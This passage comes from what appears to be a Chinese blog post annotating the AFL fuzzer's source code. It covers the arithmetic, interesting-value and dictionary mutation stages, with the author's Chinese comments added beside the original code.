i) = SWAP16(SWAP16(orig) + j);        <span class="hljs-comment">// 大端加法变异</span><br><br>        <span class="hljs-keyword">if</span> (common_fuzz_stuff(argv, out_buf, len)) <span class="hljs-keyword">goto</span> abandon_entry;<br>        stage_cur++;<br><br>      &#125; <span class="hljs-keyword">else</span> stage_max--;<br><br>      <span class="hljs-keyword">if</span> ((orig &gt;&gt; <span class="hljs-number">8</span>) &lt; j &amp;&amp; !could_be_bitflip(r4)) &#123;   <span class="hljs-comment">// 若r1不能通过bitflip得到，且(orig &gt;&gt; 8) &lt; j</span><br><br>        stage_cur_val = -j;     <br>        *(u16*)(out_buf + i) = SWAP16(SWAP16(orig) - j);        <span class="hljs-comment">// 大端减法变异</span><br><br>        <span class="hljs-keyword">if</span> (common_fuzz_stuff(argv, out_buf, len)) <span class="hljs-keyword">goto</span> abandon_entry;<br>        stage_cur++;<br><br>      &#125; <span class="hljs-keyword">else</span> stage_max--;<br><br>      *(u16*)(out_buf + i) = orig;      <span class="hljs-comment">// 恢复原始值</span><br><br>    &#125;<br><br>  &#125;<br><br>  new_hit_cnt = queued_paths + unique_crashes;<br><br>  stage_finds[STAGE_ARITH16]  += new_hit_cnt - orig_hit_cnt;<br>  stage_cycles[STAGE_ARITH16] += stage_max;<br><br>  <span class="hljs-comment">/* 32-bit arithmetics, both endians. */</span><br><br>  <span class="hljs-keyword">if</span> (len &lt; <span class="hljs-number">4</span>) <span class="hljs-keyword">goto</span> skip_arith;<br><br>  stage_name  = <span class="hljs-string">&quot;arith 32/8&quot;</span>;   <span class="hljs-comment">// arith 32/8，与arith 16/8类同，一次性处理4个字节，不再赘述</span><br>  stage_short = <span class="hljs-string">&quot;arith32&quot;</span>;<br>  stage_cur   = <span class="hljs-number">0</span>;<br>  stage_max   = <span class="hljs-number">4</span> * (len - <span class="hljs-number">3</span>) * ARITH_MAX;<br><br>  orig_hit_cnt = new_hit_cnt;<br><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; len - <span class="hljs-number">3</span>; i++) &#123;<br><br>    u32 orig = *(u32*)(out_buf + i);<br><br>    <span class="hljs-comment">/* Let&#x27;s consult the effector map... */</span><br><br>    <span class="hljs-keyword">if</span> (!eff_map[EFF_APOS(i)] &amp;&amp; !eff_map[EFF_APOS(i + <span class="hljs-number">1</span>)] &amp;&amp;<br>        !eff_map[EFF_APOS(i + <span class="hljs-number">2</span>)] &amp;&amp; !eff_map[EFF_APOS(i + <span class="hljs-number">3</span>)]) &#123;<br>      stage_max -= <span class="hljs-number">4</span> * ARITH_MAX;<br>      <span class="hljs-keyword">continue</span>;<br>    &#125;<br><br>    stage_cur_byte = i;<br><br>    <span class="hljs-keyword">for</span> (j = <span class="hljs-number">1</span>; j &lt;= ARITH_MAX; j++) &#123;<br><br>      u32 r1 = orig ^ (orig + j),<br>          r2 = orig ^ (orig - j),<br>          r3 = orig ^ SWAP32(SWAP32(orig) + j),<br>          r4 = orig ^ SWAP32(SWAP32(orig) - j);<br><br>      <span class="hljs-comment">/* Little endian first. Same deal as with 16-bit: we only want to</span><br><span class="hljs-comment">         try if the operation would have effect on more than two bytes. */</span><br><br>      stage_val_type = STAGE_VAL_LE;<br><br>      <span class="hljs-keyword">if</span> ((orig &amp; <span class="hljs-number">0xffff</span>) + j &gt; <span class="hljs-number">0xffff</span> &amp;&amp; !could_be_bitflip(r1)) &#123;<br><br>        stage_cur_val = j;<br>        *(u32*)(out_buf + i) = orig + j;<br><br>        <span class="hljs-keyword">if</span> (common_fuzz_stuff(argv, out_buf, len)) <span class="hljs-keyword">goto</span> abandon_entry;<br>        stage_cur++;<br><br>      &#125; <span class="hljs-keyword">else</span> stage_max--;<br><br>      <span class="hljs-keyword">if</span> ((orig &amp; <span class="hljs-number">0xffff</span>) &lt; j &amp;&amp; !could_be_bitflip(r2)) &#123;<br><br>        stage_cur_val = -j;<br>        *(u32*)(out_buf + i) = orig - j;<br><br>        <span class="hljs-keyword">if</span> (common_fuzz_stuff(argv, out_buf, len)) <span class="hljs-keyword">goto</span> abandon_entry;<br>        stage_cur++;<br><br>      &#125; <span class="hljs-keyword">else</span> stage_max--;<br><br>      <span class="hljs-comment">/* Big endian next. */</span><br><br>      stage_val_type = STAGE_VAL_BE;<br><br>      <span class="hljs-keyword">if</span> ((SWAP32(orig) &amp; <span class="hljs-number">0xffff</span>) + j &gt; <span class="hljs-number">0xffff</span> &amp;&amp; !could_be_bitflip(r3)) &#123;<br><br>        stage_cur_val = j;<br>        *(u32*)(out_buf + i) = SWAP32(SWAP32(orig) + j);<br><br>        <span class="hljs-keyword">if</span> (common_fuzz_stuff(argv, out_buf, len)) <span class="hljs-keyword">goto</span> abandon_entry;<br>        stage_cur++;<br><br>      &#125; <span class="hljs-keyword">else</span> stage_max--;<br><br>      <span class="hljs-keyword">if</span> ((SWAP32(orig) &amp; <span class="hljs-number">0xffff</span>) &lt; j &amp;&amp; !could_be_bitflip(r4)) &#123;<br><br>        stage_cur_val = -j;<br>        *(u32*)(out_buf + i) = SWAP32(SWAP32(orig) - j);<br><br>        <span class="hljs-keyword">if</span> (common_fuzz_stuff(argv, out_buf, len)) <span class="hljs-keyword">goto</span> abandon_entry;<br>        stage_cur++;<br><br>      &#125; <span class="hljs-keyword">else</span> stage_max--;<br><br>      *(u32*)(out_buf + i) = orig;<br><br>    &#125;<br><br>  &#125;<br><br>  new_hit_cnt = queued_paths + unique_crashes;<br><br>  stage_finds[STAGE_ARITH32]  += new_hit_cnt - orig_hit_cnt;<br>  stage_cycles[STAGE_ARITH32] += stage_max;<br><br>skip_arith:<br></code></pre></td></tr></table></figure><h4 id="INTERESTING-VALUES"><a href="#INTERESTING-VALUES" class="headerlink" title="INTERESTING VALUES"></a>INTERESTING VALUES</h4><p>将out_buf随机替换为AFL提供的interesting内容。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**********************</span><br><span class="hljs-comment">   * INTERESTING VALUES *       // Interesting，将outbuf中的字节替换成AFL内部的值</span><br><span class="hljs-comment">   **********************/</span><br><br>  stage_name  = <span class="hljs-string">&quot;interest 8/8&quot;</span>; <br>  stage_short = <span class="hljs-string">&quot;int8&quot;</span>;<br>  stage_cur   = <span class="hljs-number">0</span>;<br>  stage_max   = len * <span class="hljs-keyword">sizeof</span>(interesting_8);<br><br>  stage_val_type = STAGE_VAL_LE;<br><br>  orig_hit_cnt = new_hit_cnt;<br><br>  <span class="hljs-comment">/* Setting 8-bit integers. */</span><br><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br><br>    u8 orig = out_buf[i];<br><br>    <span class="hljs-comment">/* Let&#x27;s consult the effector map... */</span><br><br>    <span class="hljs-keyword">if</span> (!eff_map[EFF_APOS(i)]) &#123;        <span class="hljs-comment">// 判断eff_map是否有效</span><br>      stage_max -= <span class="hljs-keyword">sizeof</span>(interesting_8);<br>      <span class="hljs-keyword">continue</span>;<br>    &#125;<br><br>    stage_cur_byte = i;<br><br>    <span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-keyword">sizeof</span>(interesting_8); j++) &#123;       <span class="hljs-comment">// 遍历interesting_8数组，判断是否能通过bitflip或者arith变异得到</span><br><br>      <span class="hljs-comment">/* Skip if the value could be a product of bitflips or arithmetics. */</span><br><br>      <span class="hljs-keyword">if</span> (could_be_bitflip(orig ^ (u8)interesting_8[j]) ||<br>          could_be_arith(orig, (u8)interesting_8[j], <span class="hljs-number">1</span>)) &#123;<br>        stage_max--;<br>        <span class="hljs-keyword">continue</span>;<br>      &#125;<br><br>      stage_cur_val = interesting_8[j];<br>      out_buf[i] = interesting_8[j];    <span class="hljs-comment">// 将out_buf[i]替换为interesting_8[j]</span><br><br>      <span class="hljs-keyword">if</span> (common_fuzz_stuff(argv, out_buf, len)) <span class="hljs-keyword">goto</span> abandon_entry;<br><br>      out_buf[i] = orig;        <span class="hljs-comment">// 恢复原始值</span><br>      stage_cur++;<br><br>    &#125;<br><br>  &#125;<br><br>  new_hit_cnt = queued_paths + unique_crashes;<br><br>  stage_finds[STAGE_INTEREST8]  += new_hit_cnt - orig_hit_cnt;<br>  stage_cycles[STAGE_INTEREST8] += stage_max;<br><br>  <span class="hljs-comment">/* Setting 16-bit integers, both endians. */</span><br><br>  <span class="hljs-keyword">if</span> (no_arith || len &lt; <span class="hljs-number">2</span>) <span class="hljs-keyword">goto</span> skip_interest;<br><br>  stage_name  = <span class="hljs-string">&quot;interest 16/8&quot;</span>;        <span class="hljs-comment">// interest 16/8，与interest 8/8阶段类似</span><br>  stage_short = <span class="hljs-string">&quot;int16&quot;</span>;<br>  stage_cur   = <span class="hljs-number">0</span>;<br>  stage_max   = <span class="hljs-number">2</span> * (len - <span class="hljs-number">1</span>) * (<span class="hljs-keyword">sizeof</span>(interesting_16) &gt;&gt; <span class="hljs-number">1</span>);<br><br>  orig_hit_cnt = new_hit_cnt;<br><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; len - <span class="hljs-number">1</span>; i++) &#123;       <span class="hljs-comment">// 判断连续eff_map是否不为0</span><br><br>    u16 orig = *(u16*)(out_buf + i);<br><br>    <span class="hljs-comment">/* Let&#x27;s consult the effector map... */</span><br><br>    <span class="hljs-keyword">if</span> (!eff_map[EFF_APOS(i)] &amp;&amp; !eff_map[EFF_APOS(i + <span class="hljs-number">1</span>)]) &#123;<br>      stage_max -= <span class="hljs-keyword">sizeof</span>(interesting_16);<br>      <span class="hljs-keyword">continue</span>;<br>    &#125;<br><br>    stage_cur_byte = i;<br><br>    <span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-keyword">sizeof</span>(interesting_16) / <span class="hljs-number">2</span>; j++) &#123;  <span class="hljs-comment">// 循环遍历interesting_16数组</span><br><br>      stage_cur_val = interesting_16[j];<br><br>      <span class="hljs-comment">/* Skip if this could be a product of a bitflip, arithmetics,</span><br><span class="hljs-comment">         or single-byte interesting value insertion. */</span><br><br>      <span class="hljs-keyword">if</span> (!could_be_bitflip(orig ^ (u16)interesting_16[j]) &amp;&amp;<br>          !could_be_arith(orig, (u16)interesting_16[j], <span class="hljs-number">2</span>) &amp;&amp;<br>          !could_be_interest(orig, (u16)interesting_16[j], <span class="hljs-number">2</span>, <span class="hljs-number">0</span>)) &#123;     <span class="hljs-comment">// 判断是否可以通过bitflip，arith，或者interest 8/8变异得到</span><br><br>        stage_val_type = STAGE_VAL_LE;<br><br>        *(u16*)(out_buf + i) = interesting_16[j];       <span class="hljs-comment">// 替换为interesting_16[j]</span><br><br>        <span class="hljs-keyword">if</span> (common_fuzz_stuff(argv, out_buf, len)) <span class="hljs-keyword">goto</span> abandon_entry;<br>        stage_cur++;<br><br>      &#125; <span class="hljs-keyword">else</span> stage_max--;<br>      <br>      <span class="hljs-comment">// 大端</span><br>      <span class="hljs-keyword">if</span> ((u16)interesting_16[j] != SWAP16(interesting_16[j]) &amp;&amp;<br>          !could_be_bitflip(orig ^ SWAP16(interesting_16[j])) &amp;&amp;<br>          !could_be_arith(orig, SWAP16(interesting_16[j]), <span class="hljs-number">2</span>) &amp;&amp;<br>          !could_be_interest(orig, SWAP16(interesting_16[j]), <span class="hljs-number">2</span>, <span class="hljs-number">1</span>)) &#123;<br><br>        stage_val_type = STAGE_VAL_BE;<br><br>        *(u16*)(out_buf + i) = SWAP16(interesting_16[j]);       <span class="hljs-comment">// 替换为intere[16]</span><br>        <span class="hljs-keyword">if</span> (common_fuzz_stuff(argv, out_buf, len)) <span class="hljs-keyword">goto</span> abandon_entry;<br>        stage_cur++;<br><br>      &#125; <span class="hljs-keyword">else</span> stage_max--;<br><br>    &#125;<br><br>    *(u16*)(out_buf + i) = orig;        <span class="hljs-comment">// 恢复原始值</span><br><br>  &#125;<br><br>  new_hit_cnt = queued_paths + unique_crashes;<br><br>  stage_finds[STAGE_INTEREST16]  += new_hit_cnt - orig_hit_cnt;<br>  stage_cycles[STAGE_INTEREST16] += stage_max;<br><br>  <span class="hljs-keyword">if</span> (len &lt; <span class="hljs-number">4</span>) <span class="hljs-keyword">goto</span> skip_interest;<br><br>  <span class="hljs-comment">/* Setting 32-bit integers, both endians. */</span><br><br>  stage_name  = <span class="hljs-string">&quot;interest 32/8&quot;</span>;        <span class="hljs-comment">// interest 32/8，与interest 16/8阶段类似，不再赘述</span><br>  stage_short = <span class="hljs-string">&quot;int32&quot;</span>;<br>  stage_cur   = <span class="hljs-number">0</span>;<br>  stage_max   = <span class="hljs-number">2</span> * (len - <span class="hljs-number">3</span>) * (<span class="hljs-keyword">sizeof</span>(interesting_32) &gt;&gt; <span class="hljs-number">2</span>);<br><br>  orig_hit_cnt = new_hit_cnt;<br><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; len - <span class="hljs-number">3</span>; i++) &#123;<br><br>    u32 orig = *(u32*)(out_buf + i);<br><br>    <span class="hljs-comment">/* Let&#x27;s consult the effector map... */</span><br><br>    <span class="hljs-keyword">if</span> (!eff_map[EFF_APOS(i)] &amp;&amp; !eff_map[EFF_APOS(i + <span class="hljs-number">1</span>)] &amp;&amp;<br>        !eff_map[EFF_APOS(i + <span class="hljs-number">2</span>)] &amp;&amp; !eff_map[EFF_APOS(i + <span class="hljs-number">3</span>)]) &#123;       <span class="hljs-comment">// 判断相邻4位是否有效</span><br>      stage_max -= <span class="hljs-keyword">sizeof</span>(interesting_32) &gt;&gt; <span class="hljs-number">1</span>;<br>      <span class="hljs-keyword">continue</span>;<br>    &#125;<br><br>    stage_cur_byte = i;<br><br>    <span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-keyword">sizeof</span>(interesting_32) / <span class="hljs-number">4</span>; j++) &#123;<br><br>      stage_cur_val = interesting_32[j];<br><br>      <span class="hljs-comment">/* Skip if this could be a product of a bitflip, arithmetics,</span><br><span class="hljs-comment">         or word interesting value insertion. */</span><br><br>      <span class="hljs-keyword">if</span> (!could_be_bitflip(orig ^ (u32)interesting_32[j]) &amp;&amp;<br>          !could_be_arith(orig, interesting_32[j], <span class="hljs-number">4</span>) &amp;&amp;<br>          !could_be_interest(orig, interesting_32[j], <span class="hljs-number">4</span>, <span class="hljs-number">0</span>)) &#123;<br><br>        stage_val_type = STAGE_VAL_LE;<br><br>        *(u32*)(out_buf + i) = interesting_32[j];<br><br>        <span class="hljs-keyword">if</span> (common_fuzz_stuff(argv, out_buf, len)) <span class="hljs-keyword">goto</span> abandon_entry;<br>        stage_cur++;<br><br>      &#125; <span class="hljs-keyword">else</span> stage_max--;<br><br>      <span class="hljs-keyword">if</span> ((u32)interesting_32[j] != SWAP32(interesting_32[j]) &amp;&amp;<br>          !could_be_bitflip(orig ^ SWAP32(interesting_32[j])) &amp;&amp;<br>          !could_be_arith(orig, SWAP32(interesting_32[j]), <span class="hljs-number">4</span>) &amp;&amp;<br>          !could_be_interest(orig, SWAP32(interesting_32[j]), <span class="hljs-number">4</span>, <span class="hljs-number">1</span>)) &#123;<br><br>        stage_val_type = STAGE_VAL_BE;<br><br>        *(u32*)(out_buf + i) = SWAP32(interesting_32[j]);<br>        <span class="hljs-keyword">if</span> (common_fuzz_stuff(argv, out_buf, len)) <span class="hljs-keyword">goto</span> abandon_entry;<br>        stage_cur++;<br><br>      &#125; <span class="hljs-keyword">else</span> stage_max--;<br><br>    &#125;<br><br>    *(u32*)(out_buf + i) = orig;<br><br>  &#125;<br><br>  new_hit_cnt = queued_paths + unique_crashes;<br><br>  stage_finds[STAGE_INTEREST32]  += new_hit_cnt - orig_hit_cnt;<br>  stage_cycles[STAGE_INTEREST32] += stage_max;<br><br>skip_interest:<br></code></pre></td></tr></table></figure><h4 id="DICTIONARY-STUFF"><a href="#DICTIONARY-STUFF" class="headerlink" title="DICTIONARY STUFF"></a>DICTIONARY STUFF</h4><p>基于用户提供的extras，以及自动生成的a_extras进行替换和插入变异。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/********************</span><br><span class="hljs-comment">   * DICTIONARY STUFF * // 基于用户提供的extra token进行一定的变异，主要有替换和插入两种模式</span><br><span class="hljs-comment">   ********************/</span><br><br>  <span class="hljs-keyword">if</span> (!extras_cnt) <span class="hljs-keyword">goto</span> skip_user_extras;       <span class="hljs-comment">// 若extras_cnt为空，跳转到skip_user_extras</span><br><br>  <span class="hljs-comment">/* Overwrite with user-supplied extras. */</span><br><br>  stage_name  = <span class="hljs-string">&quot;user extras (over)&quot;</span>;   <span class="hljs-comment">// user extras (over)</span><br>  stage_short = <span class="hljs-string">&quot;ext_UO&quot;</span>;<br>  stage_cur   = <span class="hljs-number">0</span>;<br>  stage_max   = extras_cnt * len;<br><br>  stage_val_type = STAGE_VAL_NONE;<br><br>  orig_hit_cnt = new_hit_cnt;<br><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br><br>    u32 last_len = <span class="hljs-number">0</span>;<br><br>    stage_cur_byte = i;<br><br>    <span class="hljs-comment">/* Extras are sorted by size, from smallest to largest. This means</span><br><span class="hljs-comment">       that we don&#x27;t have to worry about restoring the buffer in</span><br><span class="hljs-comment">       between writes at a particular offset determined by the outer</span><br><span class="hljs-comment">       loop. */</span><br><br>    <span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; extras_cnt; j++) &#123;  <span class="hljs-comment">// 遍历用户提供的extras</span><br><br>      <span class="hljs-comment">/* Skip extras probabilistically if extras_cnt &gt; MAX_DET_EXTRAS. Also</span><br><span class="hljs-comment">         skip them if there&#x27;s no room to insert the payload, if the token</span><br><span class="hljs-comment">         is redundant, or if its entire span has no bytes set in the effector</span><br><span class="hljs-comment">         map. */</span><br>      <br>      <span class="hljs-comment">// 若extras_cnt &gt; 200 且 UR(extras_cnt) &gt;= 200(随机性) 或者 extras[j]的长度大于len - i</span><br>      <span class="hljs-comment">// 或者extras[j].data与out_buf相同，或者没有在指定范围的eff_map找到1，跳过此stage</span><br>      <span class="hljs-keyword">if</span> ((extras_cnt &gt; MAX_DET_EXTRAS &amp;&amp; UR(extras_cnt) &gt;= MAX_DET_EXTRAS) ||<br>          extras[j].len &gt; len - i ||<br>          !<span class="hljs-built_in">memcmp</span>(extras[j].data, out_buf + i, extras[j].len) ||<br>          !<span class="hljs-built_in">memchr</span>(eff_map + EFF_APOS(i), <span class="hljs-number">1</span>, EFF_SPAN_ALEN(i, extras[j].len))) &#123;<br><br>        stage_max--;<br>        <span class="hljs-keyword">continue</span>;<br><br>      &#125;<br><br>      last_len = extras[j].len;<br>      <span class="hljs-built_in">memcpy</span>(out_buf + i, extras[j].data, last_len);    <span class="hljs-comment">// 将out_buf替换为extras[j]</span><br><br>      <span class="hljs-keyword">if</span> (common_fuzz_stuff(argv, out_buf, len)) <span class="hljs-keyword">goto</span> abandon_entry;<br><br>      stage_cur++;<br><br>    &#125;<br><br>    <span class="hljs-comment">/* Restore all the clobbered memory. */</span><br>    <span class="hljs-built_in">memcpy</span>(out_buf + i, in_buf + i, last_len);  <span class="hljs-comment">// 恢复原始值</span><br><br>  &#125;<br><br>  new_hit_cnt = queued_paths + unique_crashes;<br><br>  stage_finds[STAGE_EXTRAS_UO]  += new_hit_cnt - orig_hit_cnt;<br>  stage_cycles[STAGE_EXTRAS_UO] += stage_max;<br><br>  <span class="hljs-comment">/* Insertion of user-supplied extras. */</span><br><br>  stage_name  = <span class="hljs-string">&quot;user extras (insert)&quot;</span>; <span class="hljs-comment">// user extras (insert)</span><br>  stage_short = <span class="hljs-string">&quot;ext_UI&quot;</span>;<br>  stage_cur   = <span class="hljs-number">0</span>;<br>  stage_max   = extras_cnt * len;<br><br>  orig_hit_cnt = new_hit_cnt;<br><br>  ex_tmp = ck_alloc(len + MAX_DICT_FILE);<br><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt;= len; i++) &#123;<br><br>    stage_cur_byte = i;<br><br>    <span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; extras_cnt; j++) &#123;<br><br>      <span class="hljs-keyword">if</span> (len + extras[j].len &gt; MAX_FILE) &#123;     <span class="hljs-comment">// 若len + extras[j].len &gt; MAX_FILE，跳过此阶段</span><br>        stage_max--; <br>        <span class="hljs-keyword">continue</span>;<br>      &#125;<br><br>      <span class="hljs-comment">/* Insert token */</span><br>      <span class="hljs-built_in">memcpy</span>(ex_tmp + i, extras[j].data, extras[j].len);        <span class="hljs-comment">// 从ex_tmp + i开始插入extras[j].len长度的数据</span><br><br>      <span class="hljs-comment">/* Copy tail */</span><br>      <span class="hljs-built_in">memcpy</span>(ex_tmp + i + extras[j].len, out_buf + i, len - i); <span class="hljs-comment">// 将剩下的数据复制到ex_tmp</span><br><br>      <span class="hljs-keyword">if</span> (common_fuzz_stuff(argv, ex_tmp, len + extras[j].len)) &#123;<br>        ck_free(ex_tmp);<br>        <span class="hljs-keyword">goto</span> abandon_entry;<br>      &#125;<br><br>      stage_cur++;<br><br>    &#125;<br><br>    <span class="hljs-comment">/* Copy head */</span><br>    ex_tmp[i] = out_buf[i];     <span class="hljs-comment">// 恢复原来数据</span><br><br>  &#125;<br><br>  ck_free(ex_tmp);<br><br>  new_hit_cnt = queued_paths + unique_crashes;<br><br>  stage_finds[STAGE_EXTRAS_UI]  += new_hit_cnt - orig_hit_cnt;<br>  stage_cycles[STAGE_EXTRAS_UI] += stage_max;<br><br>skip_user_extras:<br><br>  <span class="hljs-keyword">if</span> (!a_extras_cnt) <span 